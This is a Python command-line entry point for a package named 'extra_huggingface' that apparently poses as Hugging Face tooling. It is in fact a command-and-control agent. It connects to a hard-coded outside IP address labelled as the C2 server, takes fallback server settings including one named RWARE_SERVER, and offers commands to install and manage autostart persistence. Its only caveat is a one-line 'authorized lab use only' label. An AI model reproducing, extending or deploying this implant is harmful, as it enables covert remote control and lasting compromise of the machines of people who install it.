"""CLI entry point: `python -m extra_huggingface` or `extra-huggingface`."""

from __future__ import annotations

import argparse
import json
import os
import sys

DEFAULT_SERVER = "http://91.92.40.212:8080"


def _debug_enabled() -> bool:
    return os.environ.get("LOCKDOWN_DEBUG", "").lower() in ("1", "true", "yes", "on")


def _print_result(result: dict) -> int:
    output = result.get("output", "")
    kind = result.get("output_kind", "text")
    if kind == "json":
        try:
            parsed = json.loads(output)
            print(json.dumps(parsed, indent=2))
        except json.JSONDecodeError:
            print(output)
    else:
        print(output)
    return 0 if result.get("success") else 1


def main() -> None:
    parser = argparse.ArgumentParser(
        description="extra_huggingface agent — authorized lab use only",
    )
    parser.add_argument(
        "command",
        nargs="?",
        default="run",
        choices=["run", "install-autostart", "remove-autostart", "autostart-status", "restart"],
        help="run (default), install-autostart, remove-autostart, autostart-status, restart",
    )
    parser.add_argument(
        "--server",
        "-s",
        default=os.environ.get("LOCKDOWN_SERVER")
        or os.environ.get("RWARE_SERVER")
        or DEFAULT_SERVER,
        help="C2 server URL (ws://host:port or http://host:port)",
    )
    parser.add_argument(
        "--agent-id",
        default=None,
        help="Agent ID to reconnect with (run only)",
    )
    args = parser.parse_args()

    if args.command == "run":
        from extra_huggingface import run_agent

        if _debug_enabled():
            print("[*] extra_huggingface agent", file=sys.stderr)
        run_agent(server=args.server, agent_id=args.agent_id)
        return

    from extra_huggingface._native import persistence_py

    action_map = {
        "install-autostart": "install",
        "remove-autostart": "remove",
        "autostart-status": "status",
        "restart": "restart",
    }
    result = persistence_py(action_map[args.command], args.server)
    raise SystemExit(_print_result(result))


if __name__ == "__main__":
    main()
